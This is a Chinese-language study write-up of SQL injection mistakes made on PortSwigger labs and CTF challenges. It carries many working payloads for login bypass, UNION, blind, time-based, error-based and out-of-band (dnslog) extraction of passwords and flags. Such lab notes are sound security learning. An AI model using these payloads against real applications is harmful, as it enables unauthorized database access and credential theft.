    SQL 注入 · 卡点复盘¶

    这份文件记录的是我自己踩过的坑，不是教科书。 每个坑的格式：现象 → 原因 → 正确做法。 按「踩坑顺序」排列，越靠前越基础。

    坑 1：把 302 当成「失败了」¶

    现象¶

    登录绕过的 lab，提交 administrator'-- 后收到：

    HTTP/2 302 Found
Location: /my-account?id=administrator
Set-Cookie: session=cUyhc6QfwmKZ60YeYMC1UpUWryqtJlYX
Content-Length: 0

    我以为是错误，因为页面跳走了、什么都没显示。

    原因¶

    302 + Set-Cookie 就是「登录成功」的标准信号。

    响应 含义
    200 + 登录表单重新显示 失败
    302 + Set-Cookie 成功，给你发凭证了
    302 + 无 Set-Cookie 跳转但没登录

    正确做法¶

    ① 看状态码：302 且带 Set-Cookie = 成功
② 跟着 Location 走：GET /my-account?id=administrator
③ 用响应里【新发的】session，不要用旧的

    记住：HTTP 状态码本身就是信息。

    坑 2：用了全角中文逗号 ，¶

    现象¶

    ' union select username_zigghx,password_hpzjqx,null from users_yrlaxw--    -- 成功
' union select username_zigghx，password_hpzjqx,null from users_yrlaxw--   -- 报错

    两条看着一模一样，一条通一条不通。

    原因¶

    ,  半角逗号 U+002C  1 字节   ← SQL 只认这个
， 全角逗号 U+FF0C  3 字节   ← 中文标点,不是 SQL 语法

    输入法停在中文模式时打的逗号。

    正确做法¶

    打 payload 前先把输入法切英文。 或者打完肉眼检查：全角字符明显更宽，占两个字符的位置。

    该用 可能打错成
    , ，
    ' ' '
    " " "
    ( ) （ ）
    ; ；
    \ ＼

    这是一类问题：所有 payload 里的标点都必须是半角。

    坑 3：不理解 ' 到底在干什么¶

    现象¶

    xyz' AND '1'='1     →  有 "Welcome back"
xyz' AND '1'='2     →  没有

    我不懂为什么加个 ' 就变成代码了，也不懂 '1'='1 后面那个引号哪来的。

    原因¶

    应用的查询模板是：

    SELECT * FROM tracking WHERE TrackingId = '【你输入的内容】'

    你的输入被包在一对引号里，是「数据」不是「代码」。

    输入: xyz' AND '1'='1
拼接: WHERE TrackingId = 'xyz' AND '1'='1'
                          └─┬─┘ └────┬────┘ └┬┘
                       字符串'xyz'  你的代码  应用自带的收尾引号

    第一个 ' 提前闭合了应用开的引号 → 后面的内容跳出字符串，变成可执行代码。

    最后那个 ' 是应用补的，恰好闭合 '1。

    正确做法¶

    '  = 越狱符:关掉应用的字符串
结尾引号 = 应用补的,要让它有地方落

    两种正确写法：

    写法 拼出来 说明
    xyz' AND '1'='1 'xyz' AND '1'='1' 靠应用补的引号闭合 ✅
    xyz' AND 1=1-- 'xyz' AND 1=1--' 用 -- 注释掉收尾引号 ✅

    ⚠️ 千万别写 xyz' AND 1=1（不带 --）：

    WHERE TrackingId = 'xyz' AND 1=1'    ← 收尾引号悬空 → 语法错误

    这就是为什么实验室用 '1'='1 而不用 1=1。

    坑 4：payload 结尾加了 ;¶

    现象¶

    TrackingId=xxx'and length((select password from users where username='administrator'))>0;

    一直 500。

    原因¶

    WHERE TrackingId = 'xxx' and length(...)>0;'
                                          ↑ ↑
                                       分号 应用补的引号

    ; 结束语句，后面孤立的 ' → 语法错误。而且很多驱动不支持一次执行多条语句。

    正确做法¶

    盲注里几乎永远不需要 ;。 用 -- 收尾：

    'and length(...)>0--

    坑 5：-- 后面没空格 / 忘了加注释¶

    现象¶

    一是 -- HTTP/2 粘在一起（URL 里），二是 >0 结尾没加 -- 直接报错。

    原因¶

    • -- 是注释，但 MySQL 要求 -- 后跟空格或控制字符（PostgreSQL/Oracle 不要求）
    • 不加 -- 时，应用补的收尾引号会悬空

    正确做法¶

    -- Oracle / PostgreSQL
>0--

-- MySQL(必须带空格)
>0--

    保险起见一律写 --（带空格），但在 URL 里空格要编码成 %20。

    坑 6：用 >'z' 做测试¶

    现象¶

    substring(password,1,1) > 'z'

    永远不报错 / 永远没有 Welcome back，我以为注入失败。

    原因¶

    ASCII 排序：

    '0'-'9' 48~57  <  'A'-'Z' 65~90  <  'a'-'z' 97~122  <  '{' '|' '}' '~' 123~126

    密码字符通常是数字和小写字母，全都 < 'z'。

    所以 > 'z' 几乎必然为假 —— 我问了个「答案必然是否」的问题。

    正确做法¶

    二分查找，从字符集中点开始：

    >'m'  →  真(500): 在 n~z
      →  假(200): 在 a~m

    或者用 ASCII 比较更稳（不受排序规则影响）：

    ASCII(SUBSTR(password,1,1)) > 77

    坑 7：FROM dual 里引用 users 的列¶

    现象¶

    select case when(username='administrator' and substr(password,1,1)>'z')
then to_char(1/0) else 'a' end from dual

    永远 500，连「恒假」那条也 500。

    原因¶

    Oracle 的 dual 表只有一列 dummy，没有 username、password。

    引用不存在的列 → ORA-00904: invalid identifier。

    为什么最小测试（1=1）能过？因为它只用了常量，不碰任何列。

    正确做法¶

    FROM users WHERE username='administrator'

    用 WHERE 限定到一行，既解决「列不存在」，也避免「多行子查询」错误。

    坑 8：括号不配对¶

    现象¶

    when(username='administrator'and substr(password,1,1)>'z' then 1/0 else 'a' end

    500。

    原因¶

    数括号：

    when(  → 深度 1
  substr(  → 深度 2
  )        → 深度 1
  >'z'
then       → 还在深度 1!缺一个 )

    正确做法¶

    CASE 的 WHEN 后面不需要括号：

    WHEN SUBSTR(password,1,1)>'z' THEN ...

    或者补齐：

    WHEN (username='administrator' AND SUBSTR(password,1,1)>'z') THEN ...

    习惯：盲注 payload 写完先数一遍 ( 和 ) 的数量。

    坑 9：else a' 少了开引号¶

    现象¶

    ... then 1/0 else a' end ...

    原因¶

    a 变成裸标识符，后面的 ' 开始了没结束的字符串 → 语法错误。

    正确做法¶

    else 'a'

    字符串必须成对。 盲注里引号错一处，表现永远是同一个 500，极难定位。

    坑 10（Oracle 专属）：CASE 分支类型不一致¶

    现象¶

    ... then 1/0 else 'a' end ...

    无论条件真假都 500。

    原因¶

    then 1/0   →  NUMBER(数字)
else 'a'   →  VARCHAR2(字符串)

    Oracle 的 CASE 要求所有分支类型一致，否则直接 ORA-00932: inconsistent datatypes —— 这发生在解析阶段，不管条件真假。

    正确做法¶

    then TO_CHAR(1/0)   ← 把数字转成字符串
else 'a'

    记忆：Oracle 里 1/0 要和字符串混用，必须 TO_CHAR(1/0)。

    坑 11：分不清「语法错误的 500」和「条件成立的 500」¶

    现象¶

    1=1 和 1=2 都返回同一个 Internal Server Error 页面。

    我以为是条件判断，其实是 payload 语法错误 —— 数据库压根没执行到判断那一步。

    原因¶

    两种情况的 HTTP 响应可以完全一样：

    情况 状态码 页面
    语法错误 500 Internal Server Error
    除零错误（条件成立） 500 Internal Server Error

    光看一条请求根本区分不了。

    正确做法¶

    必须做「恒真 / 恒假」对照：

    ① 1=1  →  必须 500
② 1=2  →  必须 200
    结果 结论
    ① 500、② 200 ✅ 通道正常
    ① ② 都 500 ❌ 语法/类型错误
    ① ② 都 200 ❌ 报错装置没生效

    这个对照是盲注的第一步，不能跳过。

    坑 12：lab 过期了，返回 504¶

    现象¶

    [!! ] 1=1 -> HTTP 504 (200 正常),预期500
[OK ] 1=2 -> HTTP 504 (200 正常),预期200

    两条都是 504，但脚本按「不是 500」判成了「正常」。

    原因¶

    PortSwigger 的 lab 实例闲置一段时间会被回收，CloudFront 返回 504 Gateway Timeout。

    504 的请求根本没到应用，更没到数据库。

    正确做法¶

    先分清是网络问题还是实例过期：

    portswigger.net         →  200   →  网络正常
<lab域名>               →  504   →  实例已过期

    处理：

    ① 回 lab 页面点 Restart lab
② 拿到新 URL(域名会变)
③ 重新抓 TrackingId
④ ⚠️ 密码也会变,长度要重新测
⑤ 更新脚本的 BASE_URL / TRACKING / PASSWORD_LEN

    脚本层面：遇到非 200/500 的状态码要直接报错，不能当成「条件为假」。

    坑 13：SUBSTRING 和 SUBSTR 混用¶

    现象¶

    在 Oracle 上用 SUBSTRING(...) → 500。

    原因¶

    数据库 取子串函数
    Oracle SUBSTR
    PostgreSQL / MySQL SUBSTRING（SUBSTR 也支持）
    SQL Server SUBSTRING

    Oracle 没有 SUBSTRING → ORA-00904。

    正确做法¶

    先确定数据库类型再写函数。 判断方法见 01-原理与识别.md。

    坑 14：Cookie 里的分隔符和空格¶

    现象¶

    Cookie 头写成：

    TrackingId=xxx'...='a'--session=GtbUq...

    分号丢了，session 被并进 TrackingId 值里。

    原因¶

    Cookie 之间必须用 ; 分隔。少了分号，整个变成一个值。

    正确做法¶

    Cookie: TrackingId=xxx'...='a'--; session=GtbUq...
                                ↑
                          分号 + 空格

    另外：Cookie 值里理论上不允许空格。 若遇到莫名失败，把空格换成 %20。

    坑 15：盲注逐字符手工试，慢到不可用¶

    现象¶

    20 位密码 × 36 个字符 = 720 次手工测试，根本跑不完。

    原因¶

    • 手工效率极低
    • Burp 社区版 Intruder 有限速，反而更慢

    正确做法¶

    ① 二分查找： 每位 7 次，20 位共 140 次 ② 多线程并发： 20 个位置同时跑

    脚本见 本目录下的 blind_sqli_error.py（条件错误型）、blind_sqli.py（条件响应型）。

    坑 16：把 MSSQL 的 IF 用在 PostgreSQL 上¶

    现象¶

    x';if(1=1)pg_sleep(5)else pg_sleep(0)--

    页面没延迟,也没报错(应用吞掉了错误)。

    原因¶

    IF ... ELSE ...     ← MSSQL 的语句
pg_sleep()          ← PostgreSQL 的函数

    两个拼一起,两边都不认:

    • PostgreSQL 没有 IF 关键字 → if(1=1) 被当成函数调用 → function if(boolean) does not exist
    • MSSQL 没有 pg_sleep

    语法错误 → 语句没执行 → 没有延迟。

    正确做法¶

    PostgreSQL 只能用 CASE 表达式:

    x';select case when (1=1) then pg_sleep(5) else pg_sleep(0) end--

    四库对照:

    数据库 条件延迟
    MSSQL ';if (1=1) waitfor delay '0:0:5'--
    PostgreSQL ';select case when (1=1) then pg_sleep(5) else pg_sleep(0) end--
    MySQL ';select case when (1=1) then sleep(5) else sleep(0) end--
    Oracle ' and case when (1=1) then dbms_pipe.receive_message(('a'),5) else 0 end=1--

    坑 17：ELSE pg_sleep(0) 写成了 ELSE 0¶

    现象¶

    case when (1=1) then pg_sleep(5) else 0 end

    报错,或行为异常。

    原因¶

    CASE 要求所有分支类型一致:

    THEN pg_sleep(5)  →  void(空)
ELSE 0            →  integer(整数)
                    ↑ 类型不一致

    PostgreSQL 报: CASE types integer and void cannot be matched

    正确做法¶

    两边都必须是 pg_sleep:

    case when (1=1) then pg_sleep(5) else pg_sleep(0) end

    这和 Oracle 里 THEN TO_CHAR(1/0) ELSE 'a' END 是同一类问题 —— 分支类型必须统一。

    坑 18：Cookie 里的 ; 没编码¶

    现象¶

    TrackingId=x';select case when ...
              ↑
        这个分号被 HTTP 当成了 cookie 分隔符

    服务器实际收到:TrackingId=x',后面的全成了另一个 cookie。

    结果:注入根本没进 SQL,但页面正常(200),看起来"什么都没发生"。

    原因¶

    Cookie: a=1; b=2
        └─┬─┘ └─┬─┘
        两个 cookie

    ; 是 HTTP 层的分隔符,不是 SQL 的。

    正确做法¶

    编码成 %3B:

    TrackingId=x'%3Bselect+case+when+...

    同理,空格编码成 +(或 %20)。

    坑 19：时间盲注用绝对阈值¶

    现象¶

    if elapsed > 3.5:   # 假定延迟 5 秒
    return True

    有时"假"的请求也判成真,密码解错。

    原因¶

    你的网络到靶场本来就有 1 秒延迟。 加上抖动,假请求可能到 2~3 秒,逼近阈值。

    正确做法¶

    先测基准,阈值用相对值:

    base = 基准延迟(3 次取中位数)
threshold = base + DELAY * 0.55     # 5 秒延迟 → base + 2.75

    两侧各留 1 秒以上余量,抖动才不会误判。

    坑 20：字符集不含大写字母,静默出错¶

    现象¶

    密码里有 A,脚本却输出 a;验证失败,但不知道哪一位错。

    原因¶

    二分查找只在给定字符集里找"最接近的那个":

    CHARSET = "0123456789abcdefghijklmnopqrstuvwxyz"
    真实字符 ASCII 会被判成
    A–Z(65–90) 在 '9' 和 'a' 之间 a
    空格 / ! / "(32–47) 比 '0' 小 0
    { \| }(123–126) 比 'z' 大 z

    不会报错,只会悄悄给错答案。

    正确做法¶

    # 不确定字符集时,用全部可打印 ASCII
CHARSET = "".join(chr(c) for c in range(32, 127))

    代价:每位多 1 次请求(6 → 7)。

    坑 21：时间盲注开了并发¶

    现象¶

    结果乱跳,同一道题重跑两次得到不同密码。

    原因¶

    并发请求会互相抢占带宽和服务器资源 → 响应时间全部偏移 → 计时判断失效。

    正确做法¶

    时间盲注只能串行。

    想提速,靠这两条:

    ① 缩小字符集(36 个 → 6 次/位)
② 降低延迟(5 秒 → 2 秒,配合基准校准)

    坑 22：跑完不验证,不知道错在哪¶

    现象¶

    脚本输出一串字符,提交后提示密码错误,然后无从下手。

    正确做法¶

    跑完发一条"整串比对"的请求:

    x'%3Bselect+case+when+(username='administrator'and+password='提取出的密码')
   +then+pg_sleep(2)+else+pg_sleep(0)+end+from+users--
    • 延迟 = 密码完全正确
    • 不延迟 = 肯定有错

    这只是 1 次请求,但能省掉无数猜测。

    坑 23：可见错误里 AND 直接接 CAST¶

    现象¶

    ' AND CAST((SELECT password FROM users LIMIT 1) AS int)--

    报错 argument of AND must be type boolean, not type integer。

    原因¶

    AND 两边都必须是布尔值,而 CAST(...) 返回整数。

    正确做法¶

    加一个比较,变成布尔:

    ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

    坑 24：payload 被截断,却以为是语法错¶

    现象¶

    Unterminated string literal started at position 97

    位置 97 落在 'administrator' 中间。

    原因¶

    cookie 值有长度上限。 你写的 payload 太长,后半截()as int)=1--)被剪掉:

    ...where username='administr        ← 字符串没闭合

    不是引号配对错,是字符不够用。

    正确做法¶

    缩短 payload:

    长写法 短写法
    where username='administrator'(31 字符) limit 1(8 字符)
    cast(...)=1 1=cast(...)

    并且:报错里的 position N 能直接告诉你被截断的位置。

    坑 25：OOB payload 里 % 没编码¶

    现象¶

    XML 里的 <!ENTITY % remote ...> 让整个 payload 报错,平台里收不到任何请求。

    原因¶

    % 是 URL 编码的引导符。 直接写 % 会被当作不完整转义。

    正确做法¶

    % → %25,而且必须【最先】替换:

    def enc(s):
    s = s.replace("%", "%25")     # 先做这个
    s = s.replace(" ", "+")
    s = s.replace('"', "%22")
    s = s.replace(";", "%3B")
    return s

    顺序错了会把刚生成的 %25 再编码一次。

    坑 26：OOB 平台在国内打不开¶

    现象¶

    interactsh (app.interactsh.com)  →  Server Unavailable...
ceye.io                          →  域名解析失败

    原因¶

    这些服务在国内网络下不可达。

    正确做法¶

    用 dnslog.cn(实测可用):

    ① http://www.dnslog.cn/  → Get Subdomain
② 拿到 xxx.dnslog.cn
③ 填进 payload
④ 发请求后点 Refresh Record

    注意:dnslog 只记录 DNS,但 Oracle 发 HTTP 前必先解析域名,所以照样能抓。

    坑 27：以为换个 OOB 平台就能绕开 PortSwigger 的限制¶

    现象¶

    用 dnslog.cn 做 OOB 题,平台上一条记录都没有。

    （我一开始以为是"能收到但 lab 不判成功",实际是"根本收不到"。）

    原因¶

    PortSwigger 的实验室环境有防火墙,阻断实验环境与「任意外部系统」的所有交互。

    官方原话： 「为防止学院平台被用于攻击第三方，我们的防火墙会阻止实验室与任意外部系统之间的交互。 要解决实验室问题，您必须使用 Burp Collaborator 的默认公共服务器。」

    lab 实例 → 防火墙 → 只放行 *.burpcollaborator.net
                    ✗ dnslog.cn
                    ✗ interactsh
                    ✗ 你的 VPS

    这个设计有两个目的：

    ① 让 lab 能判定成功（它监控自己的 Collaborator 服务器）
② 防止有人拿 PortSwigger 的靶场去打第三方

    所以这不是「判定问题」,是「通道问题」—— 请求压根没出去。

    正确做法¶

    情况 能否完成
    有 Burp Pro ✅ 用默认公共 Collaborator
    只有 Community ❌ 必须用 Pro 试用版
    校赛 / CTF 靶场 ✅ dnslog.cn 可用（没有这层防火墙）
    本地搭的靶场 ✅ 自己的 VPS 可用

    结论:社区版无法完成任何 OOB 类 lab —— 不是手法问题,是工具缺口。

    但手法是通用的 —— 只有 PortSwigger 的靶场有这层限制。

    坑 28：DNS 标签超长 / 含非法字符¶

    现象¶

    OOB 平台收到的是被截断的域名,或者根本没收到。

    原因¶

    限制 数值
    单个标签 ≤ 63 字符
    允许字符 a-z 0-9 -

    密码里的 _、.、大写都可能出问题。

    正确做法¶

    -- 分段
(SELECT SUBSTR(password,1,30) FROM users WHERE username='administrator')

-- 转十六进制
Oracle : (SELECT RAWTOHEX(password) FROM users)
MySQL  : (SELECT HEX(password) FROM users)

    坑 29：参数为空，SQL 压根没执行¶

    现象¶

    GET /check.php?username=admin'#&password=

    返回:

    <h1>Input your username and password</h1>    ← 545 字节

    看着像"注入失败",其实是"没轮到 SQL"。

    原因¶

    很多程序在拼 SQL 之前先做业务校验:

    $username = $_GET['username'];
$password = $_GET['password'];

if (empty($username) || empty($password)) {
    die("<h1>Input your username and password</h1>");   // ← 在这里就返回了
}

$sql = "SELECT * FROM users WHERE username='$username' AND password='$password'";

    empty($password) 直接 die,后面的注入根本执行不到。

    怎么分辨¶

    页面提示 含义
    "请输入 / Input your..." 前置校验没过,SQL 没执行
    "用户名或密码错误" SQL 执行了,只是没匹配
    报错堆栈 SQL 执行了且出错

    实测对比（同一题）:

    请求 长度 页面
    admin'%23 + password=(空) 545 Input your username and password
    admin'%23 + password=1 813 Login Success!
    1'%23 + password=21 548 NO,Wrong username password

    正确做法¶

    给个非空值,哪怕是无意义的 1:

    username=admin'%23&password=1

    同类前置校验一览¶

    校验 表现 绕过
    非空检查 空值直接返回 给个非空值
    长度限制 太短/太长被拒 凑够长度
    is_numeric 只收数字 换参数或找二次注入
    正则白名单 只允许字母数字 换参数
    MD5 处理 密码先哈希 只打用户名

    教训:注入前先确认「参数能不能走到 SQL」。

    坑 30：URL 里的 # 是锚点，后面参数全丢¶

    现象¶

    GET /check.php?username=1'#&password=21

    返回 545 "Input your username and password" —— 和"空密码"一模一样。

    明明写了 password=21,为什么说密码为空?

    原因¶

    # 在 URL 里是 fragment（锚点）的起点,后面的内容不会发给服务器。

    你发的:     /check.php?username=1'#&password=21
                                  └──────┬──────┘
                                    被当成锚点丢弃

服务器收到: /check.php?username=1'
                              ↑ password 参数根本不存在

    → 触发非空校验（坑 29）→ 545

    验证（原始 TCP，不经任何客户端处理）¶

    请求 服务器返回
    username=1'#&password=21 Input your username and password（545）
    username=1'%23&password=21 NO,Wrong username password（548）
    username=admin'%23&password=21 Login Success!（813）

    说明:# 是服务器端（openresty）就截断了,不是工具的问题。

    正确做法¶

    # 必须写成 %23:

    username=admin'%23&password=21

    为什么浏览器里"好像能用"¶

    浏览器提交表单 → 自动把 # 编码成 %23 → 正常
Burp / Caido 手打 → # 原样发出 → 服务器截断

    所以:在 Burp 里手写 payload,# 一律 %23。

    同源问题¶

    这和坑 18（Cookie 里的 ; 必须 %3B）是同一类:

    字符 在 HTTP 层的作用 必须编码成
    ; Cookie 分隔符 %3B
    # URL 锚点起点 %23
    & 参数分隔符（值里出现时） %26
    + 空格（表单编码） 想表达 + 时写 %2B
    空格 非法字符 %20 或 +

    一句话:payload 里的特殊字符,先想它在 HTTP 层是什么意思。

    坑 31：' 前面那个值不是真实用户¶

    现象¶

    GET /check.php?username=1'%23&password=21

    返回:

    NO,Wrong username password！！！

    注入语法是对的,但登录还是失败。

    原因¶

    1'# 拼出来的 SQL 是:

    SELECT * FROM users WHERE username='1'

    数据库里没有叫 1 的用户 → 查不到行 → 判定登录失败。

    注入成功了,但"逻辑上"没匹配到任何数据。

    三种写法,三种用途¶

    目的 写法 用户必须存在吗
    登录绕过（已知用户） admin'# ✅ 需要
    登录绕过（万能） ' or 1=1# ❌ 不需要
    UNION 取数据 -1' union select 1,2,3# ❌ 故意查空

    万能密码的 SQL:

    SELECT * FROM users WHERE username='' or 1=1#' AND password='21'

    1=1 恒真 → 返回表里第一行 → 登录成功。

    正确做法¶

    不知道用户名时用:

    username='%20or%201=1%23&password=1

    实测同样返回 813 "Login Success"。

    顺手记：为什么 UNION 要用 -1'¶

    admin'  union select 1,2,3#   -- admin 那行先返回,页面显示 admin,union 结果被盖住
-1'     union select 1,2,3#   -- 查不到任何行,页面只显示 union 的结果

    -1 是"故意让它查不到",这样 UNION 的结果才看得见。

    这是每道 UNION 题都要用的技巧,不是随便选个数字。

    坑 32：报错注入只回了 31 个字符，以为数据丢了¶

    现象¶

    'or(extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)))))#

    只回了:

    Error! XPATH syntax error: '~CTF2{461c1496-eec5-4e07-b12a-94'

    长度 42 的 flag 只出来 31 个字符,后半截没了。

    原因¶

    MySQL 的 XPATH 报错最多显示 32 个字符,其中 ~ 占 1 个 → 数据只剩 31 个。

    实测(故意塞 36 个字符):

    输入:'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
输出:'~ABCDEFGHIJKLMNOPQRSTUVWXYZ01234'
     └┬┘└────────── 31 个 ──────────┘

    不是数据丢了,是消息太长了 MySQL 不肯全打。

    正确做法¶

    分片取,公式 right(left(数据, 结束位置), 31):

    -- 第 1~31
'or(extractvalue(1,concat(0x7e,(select(left(group_concat(password),31))from(H4rDsq1)))))#

-- 第 32~62
'or(extractvalue(1,concat(0x7e,(select(right(left(group_concat(password),62),31))from(H4rDsq1)))))#

    先查 length() 知道总长,再按 31 一段切,最后拼起来。

    其他数据库的限制不一样:

    数据库 一次能带
    MySQL extractvalue 31
    Oracle XMLType 约 64
    PostgreSQL CAST 较长
    SQL Server CONVERT 较长

    MySQL 还有能带更多字符的:

    ' or(geometrycollection((select(group_concat(password))from(H4rDsq1))))#

    坑 33：没测报错回显，直接闷头做盲注¶

    现象¶

    花了半小时写二分脚本,跑了 300 多条请求,才拿到 20 个字符。

    而旁边一条报错注入请求就能回 31 个字符。

    原因¶

    决策顺序错了。

    正确做法:按这个顺序选打法¶

    ① 花 5 秒测报错会不会回显
   ' and extractvalue(1,'~')-- 
   ├─ 返回 XPATH syntax error  → ✅ 报错注入(最快)
   └─ 正常页面                → 往下走
② 看状态码差异               → 条件错误盲注
③ 看页面内容差异             → 条件响应盲注
④ 什么都没差异               → 时间盲注
⑤ 时间也不能用               → OOB

    报错注入永远排在盲注前面。

    一次报错 31 字符 vs 一次盲注 1 bit,差几十倍。

    判断口诀¶

    能看报错就看报错,能看状态码就看状态码, 能看内容就看内容,什么都没有才去数时间。

    附：盲注调试的几个「一步到位」检查¶

    想确认什么 用哪条 期望
    lab 是否活着 直接 GET 根路径 200
    引号能否打断 xxx' 500
    注释能否收尾 xxx'-- 200
    表名列名对不对 'and(select case when(length(password)>0) then to_char(1/0) else 'a' end from users where username='administrator')='a'-- 500
    数据库是不是 Oracle 'and(select 1 from dual)=1-- 200 是 Oracle
    通道是否正常 1=1 → 500，1=2 → 200 两条不同
    堆叠查询能不能用 ';select pg_sleep(5)-- 慢 5 秒
    CASE 能不能用 ';select case when (1=1) then pg_sleep(5) else pg_sleep(0) end-- 慢 5 秒
    OOB 通道通不通 xmltype + 你的域名 平台出现记录
    参数有没有被前置校验拦掉 把某个参数留空 返回"请输入..."说明有非空校验
    # 有没有被截断 对比 # 和 %23 结果不同说明 # 被当锚点了
    用户名是不是真实存在 admin'%23 vs ' or 1=1%23 后者成功说明前者查的是不存在的用户

    按这个顺序排查，能定位 90% 的问题。
